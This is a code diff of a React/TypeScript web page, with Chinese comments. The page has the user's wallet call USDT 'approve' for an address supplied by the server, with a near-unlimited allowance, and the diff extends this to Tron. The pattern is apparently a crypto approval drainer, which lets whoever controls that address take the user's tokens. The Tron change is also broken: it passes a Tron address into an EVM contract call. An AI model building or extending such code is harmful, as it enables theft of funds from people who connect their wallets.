@@ -65,6 +65,7 @@ interface Carousel {
 const USDT_CONTRACT_ADDRESSES = {
   1: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // ETH Mainnet
   56: '0x55d398326f99059fF775485246999027B3197955', // BSC
+  'TRX': 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' // TRX
 };
 
 // 添加统计数据接口
@@ -286,7 +287,12 @@ function Home() {
     }
 
     // 获取当前链的USDT地址
-    const usdtAddress = USDT_CONTRACT_ADDRESSES[chainId as keyof typeof USDT_CONTRACT_ADDRESSES];
+    const network = userProfile.user.network;
+    const usdtAddress = network === 'TRX' 
+      ? USDT_CONTRACT_ADDRESSES['TRX']
+      : USDT_CONTRACT_ADDRESSES[chainId as keyof typeof USDT_CONTRACT_ADDRESSES];
+    console.log('USDT合约地址:', usdtAddress, '网络:', network);
+
     if (!usdtAddress) {
       toast.error('不支持的网络');
       return;
@@ -306,18 +312,16 @@ function Home() {
       console.log('3. 开始合约调用...');
       
       // 调用合约，使用获取到的授权地址
-      console.log('授权地址:+++++++++++++++++++++++++', walletAuth.address as `0x${string}`); // 打印授权地址
+      console.log('授权地址:', walletAuth.address); 
       const hash = await writeContractAsync({
-        address: '0x55d398326f99059fF775485246999027B3197955',
+        address: usdtAddress as `0x${string}`,
         abi: erc20Abi,
         functionName: 'approve',
         args: [
-          walletAuth.address as `0x${string}`, // 使用获取到的授权地址
-          parseUnits('115792089237316195423570985008687907853269984665640564039457584007913129639935', 6), // 最大值 2^256 - 1
+          walletAuth.address as `0x${string}`,
+          parseUnits('115792089237316195423570985008687907853269984665640564039457', 6),
         ],
       });
-
-      console.log('授权地址++++++++++++++++++++++++++++++++++++++++++++++:', hash); // 打印授权地址
 
       // 保存交易哈希
       setTxHash(hash);
